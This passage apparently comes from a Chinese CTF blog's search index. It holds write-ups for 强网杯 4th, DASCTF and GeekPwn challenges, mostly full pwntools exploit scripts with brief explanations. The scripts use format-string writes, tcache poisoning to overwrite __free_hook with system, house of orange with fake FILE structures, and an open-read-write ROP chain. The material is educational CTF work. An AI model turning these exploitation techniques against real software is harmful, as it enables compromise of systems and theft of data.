ru(\"\u003e\u003e\u003e \") sl(\"Remind me to \"+payload) def exp(): libc=ELF(\"./libc.so.6\") attack(\"%7$p%83$p\") ru(\"to \") stack=int(r(14),16)-8 libc_start=int(r(14),16)-231 libc_base=libc_start-libc.symbols[\"__libc_start_main\"] info_addr(\"stack\",stack) info_addr(\"libc_base\",libc_base) one_gadget=libc_base+0x10a45c info_addr(\"one_gadget\",one_gadget) length=27 payload='' base=63 for i in range(6): data=one_gadget\u00260xff if data \u003e length: payload+=\"%\"+str(data-length)+'c%'+str(base+i)+'$hhn' elif data\u003clength: payload+=\"%\"+str(256+data-length)+'c%'+str(base+i)+'$hhn' else: payload+='c%'+str(base+i)+'$hhn' length=data one_gadget\u003e\u003e=8 if ((len(payload)+27)%8): length=len(payload)+8-((len(payload)+27)%8) else: length=len(payload) payload=payload.ljust(length,\"\\x01\")+\"\\x01\"*6+p64(0)*4 for i in range(6): payload+=p64(stack+i) attack(payload) itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:3:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"侧方 程序的加密逻辑是先对输入字符异或一个字节数据后，再按4个字节为一组，对每一组进行一次循环右移。 解密逻辑也就很清楚了，先将加密后的字符串，按4个为一组，进行一次循环左移，再疑惑相应字节数据，就可以获得flag。 encode=\"L,x,|,d,T,U,w,e,\\\\,I,v,N,h,C,B,O,L,q,D,N,f,W,},I,m,F,Z,C,t,i,y,x,O,\\\\,P,W,^,e,b,D\" arry=encode.split(\",\") key=[0x51,0x57,0x42,0x6c,0x6f,0x67,0x73] flag='' for i in range(len(arry)/4): temp=arry[i*4] arry[i*4]=arry[i*4+1] arry[i*4+1]=arry[i*4+2] arry[i*4+2]=arry[i*4+3] arry[i*4+3]=temp encode=\"\".join(arry) print encode for i in range(len(encode)): flag+=chr((ord(encode[i])-0x41)^key[i%7]) print flag print hex(len(encode)) ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:4:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"direct 打开一个目录后，会在堆块中分配一个地址用于储存目录内的文件信息等，如果在这个目录堆块中构造几个假的堆块，并让其中一个堆块free到unsorted bin中，这样就可以泄漏libc的地址。程序在编辑功能中，用的是有符号数，这里的if判断就可以很容的绕过，进而实现堆溢出。为了实现释放目录堆块中的假堆块，我们需要先利用一次tcache攻击，来获得这个堆块，再释放。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process(\"./direct\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(index,size): choice(1) ru(\":\") sl(str(index)) ru(':') sl(str(size)) def edit(index,offset,size,content): choice(2) ru(\":\") sl(str(index)) ru(\":\") sl(str(offset)) ru(':') sl(str(size)) ru(':') s(content) def delete(index): choice(3) ru(':') sl(str(index)) def open_file(): choice(4) def close_file(): choice(5) def exp(): libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") open_file() close_file() for i in range(7): add(i,0x80) edit(0,-0x8010+0x20,0x8010-0x20,p64(0)+p64(0x91)+b\"\\x00\"*0x88+p64(0x91)+b\"\\x00\"*0x88+p64(0x91)) delete(0) delete(1) edit(2,-0x90,0x90,b\"\\xc0\\x72\") add(0,0x80) add(7,0x80) add(1,0x80) for i in range(8): delete(i) for i in range(7): add(6-i,0x80) edit(0,-0x8090+0x10,0x8090-0x10,\"A\"*16) close_file() ru(\"A\"*5) malloc_hook=u64(r(6).ljust(8,\"\\x00\"))-96-0x10 libc_base=malloc_hook-libc.symbols[\"__malloc_hook\"] free_hook=libc_base+libc.symbols[\"__free_hook\"] system=libc_base+libc.symbols[\"system\"] info_addr(\"libc_base\",libc_base) delete(3) delete(0) edit(2,-0x90,0x90,p64(free_hook)) add(8,0x80) add(9,0x80) edit(9,0,0x10,p64(system)) edit(8,0,0x10,\"/bin/sh\") delete(8) itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:5:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"easypwn 读入字符函数存在off by null，利用这个漏洞可以实现堆重叠。由于程序调用了mallopt(1,0),该函数可以修改程序malloc的一些配置，这条语句的参数将会禁用fast bin功能，所以我们首先需要利用unsorted bin attack来修改global_max_fast，使其能使用fast bin。由于其输出用的是puts，所以可以攻击IO_file来泄漏libc，进而获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process(\"./easypwn\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(size): choice(1) ru(':') sl(str(size)) def edit(index,content,full=False): choice(2) ru(':') sl(str(index)) ru(':') if full: s(content) else: sl(content) def delete(index): choice(3) ru(':') sl(str(index)) def exp(): libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") add(0x10) #+0 add(0x10) #+1 add(0x68) #+2 add(0x68) #+3 add(0xf0) #+4 add(0x68) #+5 add(0x10) #+6 delete(0) #-0 edit(3,\"\\x00\"*0x60+p64(0x120),full=True) delete(4) #-4 add(0x210) #+0 edit(0,\"\\x00\"*0x18+p64(0x21)+\"\\x00\"*0x18+p64(0x71)+\"\\x00\"*0x68+p64(0x71)+\"\\x00\"*0x68+p64(0x101)) delete(3) #-3 add(0x68) #+3 delete(1) #-1 edit(0,\"\\x00\"*0x18+p64(0x21)+p64(0)+\"\\xe8\\x37\") add(0x10) #+1 delete(5) #-5 delete(2) #-2 edit(0,\"\\x00\"*0x18+p64(0x21)+\"\\x00\"*0x18+p64(0x71)+\"\\xb0\\x70\") edit(3,\"\\xdd\\x25\") add(0x68) add(0x68) add(0x68) #5 edit(5,\"\\x00\"*3+p64(0)*6+p64(0xfbad1800)+p64(0)*3+\"\\x00\") ru(\"\\xa3\") stdout=u64((\"\\xa3\"+r(5)).ljust(8,\"\\x00\"))-131 libc_base=stdout-libc.symbols[\"_IO_2_1_stdout_\"] malloc_hook=libc_base+libc.symbols[\"__malloc_hook\"] realloc=libc_base+libc.symbols[\"realloc\"] onegadget=libc_base+0x4527a info_addr(\"libc\",libc_base) info_addr(\"malloc_hook\",malloc_hook) info_addr(\"realloc\",realloc) info_addr(\"onegadget\",onegadget) delete(2) edit(0,\"\\x00\"*0x18+p64(0x21)+\"\\x00\"*0x18+p64(0x71)+p64(malloc_hook-0x23)) add(0x68) add(0x68) edit(7,\"\\x00\"*0xb+p64(onegadget)+p64(realloc)) add(0x68) itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:6:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"galgame 在编辑函数处，存在堆溢出，利用该漏洞可以实现house of orange，进而将一个堆块释放，再分配的堆块将会保留其数据，进而可以达到泄漏。除了这一个漏洞，在编辑函数出，对于输入地址的限制是只需要gift数组寻址后的地址上有值就可以，这样的话就可以伪造一个地址在gift数组下方，来达到任意地址写的目的。而5功能就可以实现这个目的。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: libc=ELF(\"./libc.so.6\") sh=remote() else: libc=ELF(\"./libc.so.6\") sh=process(\"./Just_a_Galgame\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh,command) def choice(elect): ru('\u003e\u003e ') sl(str(elect)) def add(): choice(1) def edit(index,content): choice(2) ru('\u003e\u003e') sl(str(index)) ru('\u003e\u003e') s(content) def add_big(): choice(3) def show(): choice(4) def message(msg): choice(5) ru(\"QAQ\") s(msg) def exp(): libc=ELF(\"/glibc/2.27/amd64/lib/libc-2.27.so\") debug(\"b*0x7ffff7b01ed2\\nc\") add() edit(0,b'a'*8+p64(0xd41)) add_big() add() show() ru(\"1: \") malloc_hook=u64(r(6).ljust(8,b\"\\x00\"))-96-0x10-0x600 libc_base=malloc_hook-libc.symbols[\"__malloc_hook\"] realloc=libc_base+libc.symbols[\"realloc\"] onegadget=libc_base+0xdeed2 info_addr(\"libc_base\",libc_base) info_addr(\"onegadget\",onegadget) info_addr(\"malloc_hook\",malloc_hook) message(p64(malloc_hook-0x8-0x60)) edit(8,p64(onegadget)+p64(realloc+2)) add() itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:7:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"oldschool mmap的编辑函数处存在溢出，可以实现任意地址写，利用在unsorted bin中的堆块，来泄漏libc，进而可以计算出目标地址与mmap基址之间的偏移。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process(\"./oldschool\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(index,size): choice(1) ru(\":\") sl(str(index)) ru(':') sl(str(size)) def edit(index,content): choice(2) ru(':') sl(str(index)) ru(':') sl(content) def show(index): choice(3) ru(':') sl(str(index)) def delete(index): choice(4) ru(':') sl(str(index)) def map_add(offset): choice(6) ru(\":\") sl(str(offset)) def map_edit(offset,value): choice(7) ru(\":\") sl(str(offset)) ru(\":\") sl(str(value)) def exp(): libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") debug(\"b*0x00000000000400B27\\nc\") add(0,0x80) add(1,0x80) delete(0) add(0,0x80) show(0) ru(\": \") malloc_hook=u64(r(6).ljust(8,'\\x00'))-88-0x10 libc_base=malloc_hook-libc.symbols[\"__malloc_hook\"] free_hook=libc_base+libc.symbols[\"__free_hook\"] system=libc_base+libc.symbols[\"system\"] info_addr(\"libc_base\",libc_base) info_addr(\"free_hook\",free_hook) info_addr(\"system\",system ) map_add(0) offset=(free_hook-0xe0000000)/4 map_edit(offset,system) #debug() itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:8:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"欲穷千里目，更上一层楼。 ——《登鹳雀楼》王之涣 ","date":"2020-07-25","objectID":"/dasctf-7%E6%9C%88%E8%B5%9B/:0:0","tags":["pwn","wp"],"title":"DASCTF-7月赛","uri":"/dasctf-7%E6%9C%88%E8%B5%9B/"},{"categories":["ctf"],"content":"虚假的签到题 一道简单的栈溢出，但是出题人在程序的最后做了一点点修改。 leave以后会修改esp为ecx-4，而ecx的值为ebp-4地址上的值。也就是：esp=[ebp-4]-4。因此我们首先需要利用格式化字符漏洞泄漏栈地址，然后修改ebp-4为我们可控的地址，并且修改该地址-4处的值为backdoor，我们就可以获得shell了。 思路总结一下： 泄漏栈地址 修改ebp-4的值为可控地址 修改可控地址-4处的值为backdoor OK，思路就是这样，但是只有自己实践一下，才能明白如何EXP的payload为何如此设置。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('183.129.189.60',10013) else: sh=process('./qiandao') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): #debug(\"b*0x080485F5\\nc\") ru(\":\") sl(\"%2$p\") ru(\"\\n\") stack=int(ru(\"\\n\").replace(\"\\n\",\"\"),16)-0x24 info_addr(\"stack\",stack) ru(\"?\") payload=p32(0x0804857D)+\"\\x00\"*0x20+p32(stack) sl(payload) itr() exp() ","date":"2020-07-25","objectID":"/dasctf-7%E6%9C%88%E8%B5%9B/:1:0","tags":["pwn","wp"],"title":"DASCTF-7月赛","uri":"/dasctf-7%E6%9C%88%E8%B5%9B/"},{"categories":["ctf"],"content":"eg32 题目逻辑很简单，写入一段shellcode，控制流将会跳转到shellcode中。难点是开启了沙箱，open/execve syscall等无法使用。 程序在一开始将flag 文件读入到内存中，但是内存地址是随机的，因此我们需要解决的问题是如何获得该地址的值。最开始我以为在栈地址上可能会有残留数据，找了一下发现没有，思路陷入了困境。最后的解决办法是爆破内存地址，由于是32位程序，所以可以在有限时间中爆破出来。 既然是爆破，那么在编写shellcode时需要注意效率问题。这里还需要提一点，就是为什么访问了非法地址，却没有报段错误。这是因为对于syscall而言，如果出错，那么eax将返回一个非零值，而不会直接终止程序。我们也可以利用eax是否小于零来判断我们有没有爆破成功。 （这里再提供publicQi师傅的一个思路：利用mmap，将ELF节结尾到libc之前的地址分配出来，然后按页大小去测试是否为零，如果不为零，则很有可能是flag分配出的虚拟内存。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process('./eg32') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): #debug(\"b*0804881C\\nc\") write=''' push 0x9000000 pop ecx push 1 pop ebx push 0x1000 pop edx push 4 pop eax int 0x80 add ecx,edx cmp eax,0 ''' exit=''' push 1 pop eax xor ebx,ebx int 0x80 ''' shellcode=asm(write)+\"\\x7C\\xF4\"+asm(exit) sa(\"flag\",shellcode) itr() exp() ","date":"2020-07-25","objectID":"/dasctf-7%E6%9C%88%E8%B5%9B/:2:0","tags":["pwn","wp"],"title":"DASCTF-7月赛","uri":"/dasctf-7%E6%9C%88%E8%B5%9B/"},{"categories":["ctf"],"content":"bigbear 题目很简单，有一个UAF漏洞，难在如何利用。题目限制使用execve，那么我们就需要利用ORW了，而想用ORW则需要栈迁移，第一个想到的是使用setcontext来实现，但是题目libc版本是2.30，setcontext无法使用，那怎么办呢？这里利用了上周geekpwn playthenew这道题目的思路。 我们先不说利用方法，先想一想要实现栈迁移的话，我们要怎么做。首先我们得把rbp修改为可控的值，然后执行leave ret对吧？我们利用UAF攻击，可以修改free_hook为任意函数，当free掉一个堆块时，会将堆块地址作为第一个参数传递给该函数。如果我们能在libc中找到一个函数片段，其有mov rbp，rdi这样形式的指令，而且还有一个call函数可控，并将call函数修改为leave ret，那么我们就可以实现栈迁移，并执行ROP链。 利用IDA搜索，我找到一个函数片段，刚好可以实现上面所诉的内容。 这个函数片段将rbp修改为[rdi+0x48]，并call [[rdi+0x18]+0x28]。我们只要精心构造该堆块的值，就可以实现栈迁移并执行ROP链。 构造的细节就不多说了，大家看看EXP，调试调试就能明白。 (不过这种方法不是预期解，预期解是利用io_file的str_overflow控制rdx来使用setcontext。get了 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('183.129.189.60',10011) else: sh=process(\"./bigbear\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru('\u003e\u003e') sl(str(elect)) def add(size,content): choice(1) ru(\":\") sl(str(size)) ru(':') sl(str(content)) def edit(index,content): choice(4) ru('idx') sl(str(index)) ru(':') sl(content) def show(index): choice(3) ru(':') sl(str(index)) def delete(index): choice(2) ru('idx') sl(str(index)) def exp(): libc=ELF(\"./libc.so.6\") add(0x1000,'a') #0 add(0x20,'a') #1 add(0x20,'a') #2 delete(0) show(0) ru(\":\") libc_base=u64(r(6).ljust(8,'\\x00'))-0x1eabe0 info_addr(\"libc_base\",libc_base) setcontext=libc_base+libc.symbols['setcontext'] free_hook=libc_base+libc.symbols['__free_hook'] secret=libc_base+0x000000000157F7A info_addr(\"setcontext\",setcontext) info_addr(\"free_hook\",free_hook) info_addr(\"secret\",secret) delete(1) delete(2) show(2) ru(\":\") heap=u64(r(6).ljust(8,'\\x00'))-0x1010 info_addr(\"heap\",heap) edit(2,p64(free_hook)+p64(0)) add(0x20,'a') add(0x20,p64(secret)) leave_ret=libc_base+0x000000000005A9A8 rdi_ret=libc_base+0x0000000000026bb2 rsi_ret=libc_base+0x000000000002709c rdx_r12_ret=libc_base+0x000000000011c3b1 open_=libc_base+libc.symbols[\"open\"] read=libc_base+libc.symbols[\"read\"] write=libc_base+libc.symbols['write'] payload=\"./flag\\x00\\x00\"+p64(rdx_r12_ret)+p64(0)+p64(heap)+p64(rdx_r12_ret)+p64(leave_ret)+p64(0)+p64(rdx_r12_ret)+p64(0)+p64(heap) payload+=p64(rdi_ret)+p64(heap)+p64(rsi_ret)+p64(0)+p64(open_) payload+=p64(rdi_ret)+p64(3)+p64(rsi_ret)+p64(heap-0x100)+p64(rdx_r12_ret)+p64(0x30)+p64(0)+p64(read) payload+=p64(rdi_ret)+p64(1)+p64(rsi_ret)+p64(heap-0x100)+p64(rdx_r12_ret)+p64(0x30)+p64(0)+p64(write) add(0x100,payload) #debug(\"b*0x7ffff7f2ff7a\\nc\") delete(5) itr() exp() ","date":"2020-07-25","objectID":"/dasctf-7%E6%9C%88%E8%B5%9B/:3:0","tags":["pwn","wp"],"title":"DASCTF-7月赛","uri":"/dasctf-7%E6%9C%88%E8%B5%9B/"},{"categories":["ctf"],"content":"春江潮水连海平，海上明月共潮生。 ——《春江花月夜》张若虚 Babypwn ","date":"2020-07-15","objectID":"/geekpwn-wp/:0:0","tags":["pwn","wp"],"title":"geekpwn-wp","uri":"/geekpwn-wp/"},{"categories":["ctf"],"content":"House of orange分析 自古babypwn并不baby，但是这道题挺baby的，可惜刚好出在了我知识盲点上。通过这道题也算是学习理解了House of orange技术，不得不说这个技术还挺有趣的。 在讲解这道题这前，我先大概讲解一下House of orange技术，也算是一次知识总结。 House of orange技术主要用在堆块申请大小受限，如只能申请0-0x40大小的chunk，这样我们就不能使用fastbin来攻击malloc_hook了，或则是程序没有free功能，我们不能释放堆块。 先讲一讲后者，因为这种情况比较简单，house of orange利用的前提是程序存在堆溢出漏洞，我们可以利用堆溢出来修改TOP chunk的大小，但这个大小有一定的限制，要求TOP chunk是页对齐的，也就是topchunk的地址加topchunk的大小\u00260x1000必须是零。当我们篡改TOPchunk为一个较小值时（满足前面的要求），我们再申请一个TOPchunk不能分配的chunk，此时TOPchunk将会被释放到bin中，然后brk一个新的TOP chunk来分配。利用这样的原理，我们就释放了一个chunk，之后的攻击就简单了。我们主要讲一讲第一种情况的利用。 当我们申请的大小只有0-0x40，但是free可以使用时，我们就需要利用FILE结构里面的一个指针IO_list_all来实施攻击，该指针将FILE文件结构连成一个单项链表，通过该指针就可以遍历程序中存在的所有FILE结构。如果我们将IO_list_all篡改成我们可以控制的值，那么我们就可以伪造一个FILE结构，进而可以伪造vtable，大家都知道FILE的一些函数是通过vtable来调用的，我们控制了vtable也就控制了控制流。不过IO_list_all遍历FILE文件结构是需要别的操作来触发的，比如当malloc发生错误时会调用malloc_printerr，malloc_printerr会调用abort，abort会调用_IO_flush_all_lockp_,IO_flush_all_lockp就会进行我们上面的一个遍历操作。这里总结一下这个调用链。 libc_malloc =\u003e malloc_printerr() =\u003e __libc_message =\u003e abort() =\u003e _IO_flush_all_lockp =\u003e _IO_overflow_t OK，我们现在来看看它是如何利用的。我们假设我们现在有一个0x91的堆块在unsorted bin中。现在我们把该堆块当成FILE文件结构，然后修改它的成员如下： flags='/bin/sh',_IO_read_ptr=0x61,_IO_read_end=0,_IO_read_base=io_list_all-0x10,_IO_write_base=2,_IO_write_ptr=3。 当我们再分配一个堆块时会发生什么？ 如我们分配一个0x20大小的chunk，由于unsorted bin中的堆块大小不等于0x20，所以其将会把0x61放入small bin中，而此时我们的bk时io_list_all-0x10，这里会发生一个unsorted bin攻击，将io_list_all指针修改为unsorted bin的地址。我们知道FILE结构中chain的偏移量是0x68，而unsorted bin的地址加0x68是small bin[4]，也就是0x59-0x68大小的small bin存储的地址。我们的0x60的堆块刚好就在这个范围内，这个时候small bin[4]的值将会被修改为0x61堆块的地址。 这个时候unsortedbin继续遍历将会发生错误，然后调用我们上面的调用链，在_IO_flush_all_lockp时，其会根据io_list_all来遍历，由于其想要遍历得到stdout文件结构，正常情况下stdout遍历两次就可以得到，而我们现在修改了io_list_all为unsortedbin的地址，其遍历两次将会得到我们的0x61chunk。换而言之，我们的0x61chunk就被伪造成了stdout。 然后其会根据vtable指向的函数表查找_IO_overflow_t调用，并将FILE结构作为参数传递出去。如果将_IO_over_flow_t修改为system，flags修改为‘/bin/sh’那么我们就可以获得shell了。所以我们只要再在0x61 chunk后面伪造一个vtable，当我们分配0x20大小堆块时就能获得shell了。 ","date":"2020-07-15","objectID":"/geekpwn-wp/:1:0","tags":["pwn","wp"],"title":"geekpwn-wp","uri":"/geekpwn-wp/"},{"categories":["ctf"],"content":"EXP 明白了house of orange后，这道题就很简单了，程序有俩个漏洞，在show时没有没有检测输入数值是否小于0，存在整形溢出，可以泄漏出libc，在add时，由于可输入的字符是size-1，如果是0那么-1的无符号数将可以实现任意输入。但是程序堆块的大小限制在了0-0x50，所以我们不能用fast bin了，但是可以用house of orange。上面以及分析过house of orange了，这里就不再说原理了，EXP里面写了利用步骤注释，相信看了EXP后会对house of orange有更深入的理解。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process('./pwn') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") def choice(elect): ru(':') sl(str(elect)) def add(name,size,descript): choice(1) ru(\":\") if len(name)==31: s(name) else: sl(name) ru(\":\") sl(str(size)) ru(\":\") if len(descript)==size-1: s(descript) else: sl(descript) def show(index): choice(3) ru(':') sl(str(index)) def delete(index): choice(2) ru(':') sl(str(index)) def pack_file_64(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _mode = 0): struct = p64(_flags) + \\ p64(_IO_read_ptr) + \\ p64(_IO_read_end) + \\ p64(_IO_read_base) + \\ p64(_IO_write_base) + \\ p64(_IO_write_ptr) + \\ p64(_IO_write_end) + \\ p64(_IO_buf_base) + \\ p64(_IO_buf_end) + \\ p64(_IO_save_base) + \\ p64(_IO_backup_base) + \\ p64(_IO_save_end) + \\ p64(_IO_marker) + \\ p64(_IO_chain) + \\ p32(_fileno) struct = struct.ljust(0x88, \"\\x00\") struct += p64(_lock) struct = struct.ljust(0xc0,\"\\x00\") struct += p64(_mode) struct = struct.ljust(0xd8, \"\\x00\") return struct def exp(): show(-5) ru(':') libc_base=u64(r(6).ljust(8,'\\x00'))-0x3c5710 io_list_all=libc_base+libc.symbols['_IO_list_all'] system=libc_base+libc.symbols['system'] info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) add('a',0,'a') #0 add('b',0x10,'b') #1 add('c',0x40,'c') #2 add('d',0x40,'d') #3 add('e',0x40,'e') #4 delete(1) #-1 delete(0) #-0 add('f',1,'') #0 show(0) #1st leak heap ru(\"Description:\") heap=u64(r(6).ljust(8,'\\x00')) info_addr(\"heap\",heap) #2st free to unsorted bin payload=p64(0)*3+p64(0xa1) add('g',0,payload) #1 delete(2) #-2 #3st attack io_list_all delete(1) #-1 payload=p64(0)*2 payload+=pack_file_64(_flags=u64(\"/bin/sh\\x00\"), _IO_read_ptr=0x61, _IO_read_end=0, _IO_read_base=io_list_all-0x10, _IO_write_base=2, _IO_write_ptr=3) vtable=heap+0x100 payload+=p64(vtable) payload+=p64(0)*2+p64(system)+p64(system) add('h',0,payload) debug() itr() exp() ","date":"2020-07-15","objectID":"/geekpwn-wp/:2:0","tags":["pwn","wp"],"title":"geekpwn-wp","uri":"/geekpwn-wp/"},{"categories":["ctf"],"content":"Reference Geekpwn-wp-r3kaping house of orange 漏洞 PaperPrinter 这道题十分有趣，程序只能malloc两次，一次是print里面，还有一次是在自己写的exit函数中的strdup。并且程序自己随机化了一个区域供用户写，这个区域还可以被free，这就是说这块区域其实就是堆块，那么就很简单了，我们在这个区域布置堆块，并修改堆块的size，fd，bk等，来达到house of orange的条件，然后调用一次malloc来get shell。有趣的一点是，程序不能泄漏heap和libc，我们需要灵活的构造堆块来利用残留的数据写出我们的目的地址。libc的修改很简单，但是对于vtable的heap这点比较有趣。需要用到small bin的bk指针，而如何让chunk进入small bin呢？可以先将堆块free到unsorted bin中然后调用一次print来将其放入smallbin。 OK看EXP会更清晰，看一看构造的堆块结构大家就会明白了。 #Author: Nopnoping from pwn import * import struct s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process('./pwn') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(offset,length,content): choice(1) ru(':') sl(str(offset)) ru(':') sl(str(length)) ru(\":\") s(content) def pwn_print(): choice(3) def delete(offset): choice(2) ru(':') sl(str(offset)) def pack_file_64(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _mode = 0): struct = p64(_flags) + \\ p64(_IO_read_ptr) + \\ p64(_IO_read_end) + \\ p64(_IO_read_base) + \\ p64(_IO_write_base) + \\ p64(_IO_write_ptr) + \\ p64(_IO_write_end) + \\ 